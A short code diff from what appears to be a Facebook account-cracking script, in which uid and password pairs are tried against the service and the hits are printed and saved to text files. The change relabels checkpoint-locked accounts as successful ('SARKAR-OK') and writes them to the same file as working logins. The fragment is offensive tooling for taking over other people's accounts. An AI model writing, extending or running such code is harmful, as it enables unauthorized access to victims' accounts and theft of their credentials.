@@ -1321,9 +1321,9 @@ class Main:
 				open("SARKAR-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[SARKAR-CP] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[SARKAR-OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("SARKAR-CP.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("SARKAR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
